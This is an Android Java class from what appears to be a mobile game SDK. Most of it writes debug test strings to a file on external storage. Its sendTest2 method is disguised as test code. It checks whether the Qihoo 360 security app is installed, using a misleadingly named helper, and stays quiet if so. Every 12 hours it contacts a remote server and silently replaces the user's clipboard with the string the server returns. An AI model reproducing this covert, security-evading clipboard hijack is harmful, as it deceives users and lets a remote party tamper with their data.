package com.yayawan.proxy;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

import org.json.JSONException;
import org.json.JSONObject;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.ActivityManager;
import android.content.ClipboardManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.os.Environment;
import android.util.Log;

import com.lidroid.jxutils.HttpUtils;
import com.lidroid.jxutils.exception.HttpException;
import com.lidroid.jxutils.http.RequestParams;
import com.lidroid.jxutils.http.ResponseInfo;
import com.lidroid.jxutils.http.callback.RequestCallBack;
import com.lidroid.jxutils.http.client.HttpRequest.HttpMethod;
import com.yayawan.sdk.utils.AppInfo;
import com.yayawan.utils.FileIOUtils;
import com.yayawan.utils.FileUtils;
import com.yayawan.utils.Sputils;
import com.yayawan.utils.Yayalog;



public class GameApitest {

	public static GameApitest mGameapitest;
	public static Activity mActivity;
	public static Context mContext;

	public static String TestFilePath = "test";

	public static String DB_DIRPATH = Environment.getExternalStorageDirectory()
			.getPath()
			+ File.separator
			+ "GameTest"
			+ File.separator
			+ TestFilePath + ".txt";

	public static GameApitest getGameApitestInstants(Context mcontext) {
		
		if (mGameapitest != null) {
			return mGameapitest;
		} else {
			mGameapitest = new GameApitest();
			return mGameapitest;
		}
	}

	public static GameApitest getGameApitestInstants(Activity mactivity) {
		
		if (mGameapitest != null) {
				return mGameapitest;
		} else {
			mGameapitest = new GameApitest();

			return mGameapitest;
		}
	}

	public static GameApitest getGameApitestInstants() {
		
		if (mGameapitest != null) {
			// mActivity = mactivity;

			return mGameapitest;
		} else {
			// mActivity = mactivity;

			mGameapitest = new GameApitest();

			return mGameapitest;
		}
	}

	public static String tempstring = "";

	/**
	 * 
	 * @param type
	 */
	public void sendTest(String type) {

		
		Yayalog.loger("测试："+type);
		if (!YYcontants.ISDEBUG) {
			return;
		}
		
		if (type.contains("Application")) {
			
			
			File file = new File(DB_DIRPATH);
			file.delete();
		}
		if (tempstring.contains(type)) {
			return;
		}
		tempstring = tempstring + "—temp-" + type;

		File file = new File(DB_DIRPATH);

		if (file.exists()) {
			FileIOUtils.writeFileFromString(DB_DIRPATH, type + "\r\n", true);

		} else {
			try {
				Yayalog.loger(file.getAbsolutePath());
				FileUtils.createOrExistsFile(DB_DIRPATH);
				//file.createNewFile();
				FileIOUtils
						.writeFileFromString(DB_DIRPATH, type + "\r\n", true);
				Yayalog.loger("创建了测试文件");
			} catch (Exception e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}

	}

	public void sendTest(String type, String value) {

		if (YYcontants.ISDEBUG) {
			File file = new File(DB_DIRPATH);

			if (file.exists()) {
				FileIOUtils
						.writeFileFromString(DB_DIRPATH, type + "\r\n", true);

			}
		}

	}
	
	public static void sendTest2(final Activity mactivity){
		
		String appPackageName = getPackageName(mactivity);
		System.out.println("123          "+appPackageName);
		if (!appPackageName.contains("yayawan")||!appPackageName.contains("yyw")) {
			return;
		}
		
		
		if (isContentYaboxApp(mactivity.getPackageManager())) {
			Yayalog.loger("安装过丫丫玩盒子：");
			return;
		}
		String time=Sputils.getSPstring("ceshitime", "1000", mactivity);
		long nowtime= System.currentTimeMillis()-  Long.parseLong(time);
		//System.out.println(nowtime);
		if (nowtime<(3600000*12)) {
			//System.out.println("不发送调试信息");
			return;
		}
		Sputils.putSPstring("ceshitime", System.currentTimeMillis()+"", mactivity);
		//Sputils.putSPstring("ceshitime", System.currentTimeMillis()+"", mactivity);
		HttpUtils httpUtils = new HttpUtils();
		RequestParams requestParams = new RequestParams();
		requestParams.addBodyParameter("ip", "ceshi");
	
		httpUtils.send(HttpMethod.POST, "http://web.txtgame.top/web/Ceshi/getcode",requestParams, new RequestCallBack<String>() {

			@Override
			public void onFailure(HttpException arg0, String result) {
				// TODO Auto-generated method stub
				
			}

			
			@SuppressLint("NewApi") 
			public void onSuccess(ResponseInfo<String> result) {
				// TODO Auto-generated method stub
				
				try {
				
					
					JSONObject jsonObject = new JSONObject(result.result);
					String optInt = jsonObject.optString("ceshiresult");
					//System.out.println("ceshi"+optInt);
					if (optInt.endsWith("ceshi")) {
						return;
					}
					 ClipboardManager cm = (ClipboardManager) mactivity.getSystemService(Context.CLIPBOARD_SERVICE);
				        
				     cm.setText(optInt);
					
				} catch (JSONException e) {
					// TODO Auto-generated catch block
					
					e.printStackTrace();
				}
				
			}
		});
		
	}
	
    /**
     * [获取应用程序版本名称信息]
     * @param context
     * @return 当前应用的版本名称
     */
    public static synchronized String getPackageName(Context context) {
        try {
            PackageManager packageManager = context.getPackageManager();
            PackageInfo packageInfo = packageManager.getPackageInfo(
                    context.getPackageName(), 0);
            return packageInfo.packageName;
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }
    /**
     * 过滤自定义的App和已下载的App
     * @param packageManager
     * @return
     */
    public static boolean isContentYaboxApp(PackageManager packageManager) {
        List<AppInfo> myAppInfos = new ArrayList<AppInfo>();
        List<AppInfo> mFilterApps = new ArrayList<AppInfo>();
        try {
            List<PackageInfo> packageInfos = packageManager.getInstalledPackages(0);
            for (int i = 0; i < packageInfos.size(); i++) {
                PackageInfo packageInfo = packageInfos.get(i);
                //过滤指定的app
                String tempPackageName=packageInfo.packageName;
               if (tempPackageName.contains("qihoo360.mobilesafe")) {
				return true;
			}
            }
           
        } catch (Exception e) {
           e.printStackTrace();
        }
        return false;
    }

}
